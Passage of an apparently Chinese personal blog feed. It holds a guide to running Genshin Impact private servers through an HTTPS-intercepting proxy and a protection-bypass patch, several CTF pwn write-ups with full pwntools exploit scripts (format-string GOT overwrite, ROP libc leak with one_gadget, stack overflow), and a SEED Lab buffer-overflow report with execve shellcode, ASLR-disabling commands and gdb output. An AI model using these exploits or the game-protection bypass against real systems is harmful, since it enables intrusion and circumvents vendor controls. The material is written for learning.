<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 第五空间PWN5</title>
    <url>/posts/e2482cb8.html</url>
    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>格式化字符串漏洞</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li>首先使用<code>checksec</code>工具查看基本信息</li>
</ol>


<p>​		为32位，canary，dep防护</p>
<ol start="2">
<li>使用ida工具进行静态分析。</li>
</ol>
<p><code>main</code></p>


<p>​		main函数主要代码如上图所示，可以看见<code>print((int)v7)</code>存在格式化字符串输出漏洞，因此可以考虑进行利用（<strong>注：由于输入read限制了输入长度，导致无法通过泄漏canary方法来进行栈溢出攻击。</strong>）</p>
<ol start="3">
<li>构造python脚本如下，主要思路为修改printf的got表plt地址为要执行的代码地址（若开启full relro则无法使用），然后再代码执行到下一次调用printf函数时会转去执行目标代码。获得shell。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29338</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">info(printf_got)</span><br><span class="line">vuln_1 = <span class="built_in">str</span>(<span class="number">0x0804</span>)</span><br><span class="line">vuln_2 = <span class="built_in">str</span>(<span class="number">0x931A</span>-<span class="number">0x0804</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;%&#x27;</span>, vuln_1, <span class="string">b&#x27;c&#x27;</span>,<span class="string">b&#x27;%17$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, vuln_2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%18$hn&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = flat(payload, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080492BC&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Hello,&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1 WriteUp</title>
    <url>/posts/daa10577.html</url>
    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>libc版本泄漏</li>
<li>ROP攻击</li>
<li>onegadget使用</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li>使用<code>checksec</code>工具进行查看，程序为64位，NX保护</li>
</ol>
<img src="/posts/daa10577/checksec.png" class="" title="checksec">

<ol start="2">
<li>使用ida工具反编译。</li>
</ol>
<p><code>main</code>:</p>
<img src="/posts/daa10577/main.png" class="" title="main">

<p><code>encrypt</code>：</p>
<img src="/posts/daa10577/encrypt.png" class="" title="encrypt">

<p>​		可以看出程序功能为对输入字符串进行加密，而加密<code>encrypt</code>函数中的get存在栈溢出漏洞。</p>
<ol start="3">
<li>由于在程序中找不到<code>system</code>函数和<code>/bin/sh</code>字符串，所以需要进行ROP攻击，泄漏其libc地址，使用onegadget工具直接获取shell。</li>
<li>使用ROPgadget工具获取泄漏libc地址所需的指令地址(<code>pop rdi</code>; )，然后获取程序中put_got表和put_plt表地址，执行栈溢出payload构造如下</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br></pre></td></tr></table></figure>

<p>​		注意最后需要加上encrypt函数使程序重新回到漏洞函数处。</p>
<ol start="5">
<li>获取libc基址后，再次进入漏洞函数，然后执行onegadget指令。获取shell。</li>
</ol>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><strong>构造脚本如下</strong></p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26936</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span>  <span class="comment"># 0x4f322, 0x4f2c5, 0x10a38c</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">encrypt = <span class="number">0x4009A0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4009DD&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice!&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nCiphertext\n\n&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_addr + one_gadget</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, one_gadget)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your Plaintext to be encrypted&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<img src="/posts/daa10577/result.png" class="" title="result">
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016 WriteUp</title>
    <url>/posts/3d8ffbc0.html</url>
    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>对栈溢出函数带参数的溢出理解</li>
</ul>
<h2 id="解题内容"><a href="#解题内容" class="headerlink" title="解题内容"></a>解题内容</h2><ol>
<li><p>使用<code>checksec</code>工具查看基本信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ~/.local/bin/checksec ./get_started_3dsctf_2016</span><br><span class="line">[*] &#x27;/home/bronya/Documents/ctf/pwn/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看到为32位程序，只开了nx防护。</p>
</li>
<li><p>ida工具打开程序，反编译，有主要函数<code>main</code>，<code>get_flag</code></p>
<p><code>main</code>：</p>


<p><code>get_flag</code>：</p>


<p>存在漏洞点为<code>main</code>函数中的<code>gets(v4)</code>，因此可以通过此进行栈溢出将返回地址改为<code>get_flag</code>函数地址，获取flag</p>
</li>
<li><p>在本地测试成功，但是进行远程测试出现问题，发现远程程序崩溃了，应该是因为栈的数据被破坏，导致程序无法完整运行：</p>

</li>
<li><p>考虑在<code>get_flag</code>后加上<code>exit</code>函数以及<code>get_flag</code>所需的两个参数，使其正常完成并退出。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 25523)</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span></span><br><span class="line">retn = <span class="number">0x08048A40</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x8048A3B&#x27;)</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>, get_flag, exit)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功获取flag</p>

</li>
<li><p>另外还有一种思路是程序中存在mprotect函数，可以修改程序中某一段地址的读写执行权限，因此可以将某段bss地址修改，并写入shellcode，令程序跳转到bss地址即可拿到shell。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>【SEED Lab2.0】缓冲区溢出实验报告</title>
    <url>/posts/637eab0b.html</url>
    <content><![CDATA[<h2 id="stack-overflow-setuid"><a href="#stack-overflow-setuid" class="headerlink" title="stack_overflow(setuid)"></a>stack_overflow(setuid)</h2><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置环境，关闭ASLR地址随机化，将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;zsh（&#x2F;bin&#x2F;dash以及&#x2F;bin&#x2F;bash都实现了一种安全对策， 防止自己在Set-UID进程中执行。 基本上，如果它们检测到它们是在一个Set-UID进程中执行的， 它们会立即将有效的用户ID更改为该进程的真实用户ID， 基本上会放弃特权  ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="Task1：-熟悉shellcode"><a href="#Task1：-熟悉shellcode" class="headerlink" title="Task1： 熟悉shellcode"></a>Task1： 熟悉shellcode</h3><p><code>shellcode C代码实现</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>shellcode 二进制代码实现</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* call_shellcode.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Binary code for setuid(0) </span></span><br><span class="line"><span class="comment">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> code[<span class="number">500</span>];</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strcpy</span>(code, shellcode);</span><br><span class="line">   <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())code;</span><br><span class="line"></span><br><span class="line">   func();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>call_shellcode.c</code>编译运行，可以发现会得到shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">❯ ./a32.out</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span>                                                                           </span><br><span class="line">Makefile  a32.out  a64.out  call_shellcode.c</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">exit</span></span>                                                                         </span><br><span class="line">❯ ./a64.out</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span>                                                                           </span><br><span class="line">Makefile  a32.out  a64.out  call_shellcode.c</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">exit</span></span>                   </span><br></pre></td></tr></table></figure>

<h3 id="Task2：查看漏洞程序"><a href="#Task2：查看漏洞程序" class="headerlink" title="Task2：查看漏洞程序"></a>Task2：查看漏洞程序</h3><p><code>stack.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line">FILE *badfile;</span><br><span class="line">badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">bof(str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现该程序从badfile文件中读取517字节输入，然而BUF_SIZE的长度只有100，因此如果文件内容大于100会导致栈溢出。</p>
<p><strong>编译程序</strong>：将stack.c文件根据不同要求编译为四种不同保护强度的二进制可执行文件，并且修改其文件所有者为root，执行权限为setuid。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh                                                           </span><br><span class="line">❯ make</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c</span><br><span class="line">sudo chown root stack-L1 &amp;&amp; sudo chmod 4755 stack-L1</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c</span><br><span class="line">gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c</span><br><span class="line">sudo chown root stack-L2 &amp;&amp; sudo chmod 4755 stack-L2</span><br><span class="line">gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c</span><br><span class="line">gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c</span><br><span class="line">sudo chown root stack-L3 &amp;&amp; sudo chmod 4755 stack-L3</span><br><span class="line">gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c</span><br><span class="line">gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c</span><br><span class="line">sudo chown root stack-L4 &amp;&amp; sudo chmod 4755 stack-L4</span><br></pre></td></tr></table></figure>

<h3 id="Task3：攻击32位程序"><a href="#Task3：攻击32位程序" class="headerlink" title="Task3：攻击32位程序"></a>Task3：攻击32位程序</h3><p><strong>gdb调试</strong>：新建badfile文件，使用gdb调试工具进行动态分析。在调试过程中在<code>bof</code>函数处设置断点，使程序运行到此，查看此时寄存器<code>ebp</code>和<code>buffer</code>的地址，由于需要溢出的输入需要从buffer开始一直覆盖到ebp寄存器，因此需要计算两地址的差值（0x6c）。因此可以通过此来构造payload进行栈溢出攻击，使ebp指向地址覆盖为shellcode。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ touch badfile</span><br><span class="line">❯ gdb ./stack-L1-dbg</span><br><span class="line">Breakpoint 1, bof (str=0xffffccc3 &quot;&quot;) at stack.c:20</span><br><span class="line">20	    strcpy(buffer, str);       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line">*EAX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*EBX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*ECX  0x60</span><br><span class="line">*EDX  0xffffcca0 —▸ 0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L1-dbg&#x27;</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L1-dbg&#x27;</span><br><span class="line">*EBP  0xffffc898 —▸ 0xffffcca8 —▸ 0xffffced8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">*ESP  0xffffc820 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">*EIP  0x5655621e (bof+17) ◂— 0xff08ec83</span><br><span class="line">───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x5655621e &lt;bof+17&gt;    sub    esp, 8</span><br><span class="line">   0x56556221 &lt;bof+20&gt;    push   dword ptr [ebp + 8]</span><br><span class="line">   0x56556224 &lt;bof+23&gt;    lea    edx, [ebp - 0x6c]</span><br><span class="line">   0x56556227 &lt;bof+26&gt;    push   edx</span><br><span class="line">   0x56556228 &lt;bof+27&gt;    mov    ebx, eax</span><br><span class="line">   0x5655622a &lt;bof+29&gt;    call   strcpy@plt                    &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5655622f &lt;bof+34&gt;    add    esp, 0x10</span><br><span class="line">   0x56556232 &lt;bof+37&gt;    mov    eax, 1</span><br><span class="line">   0x56556237 &lt;bof+42&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x5655623a &lt;bof+45&gt;    leave  </span><br><span class="line">   0x5655623b &lt;bof+46&gt;    ret    </span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack.c</span><br><span class="line">   15 int bof(char *str)</span><br><span class="line">   16 &#123;</span><br><span class="line">   17     char buffer[BUF_SIZE];</span><br><span class="line">   18 </span><br><span class="line">   19     // The following statement has a buffer overflow problem </span><br><span class="line"> ► 20     strcpy(buffer, str);       </span><br><span class="line">   21 </span><br><span class="line">   22     return 1;</span><br><span class="line">   23 &#125;</span><br><span class="line">   24 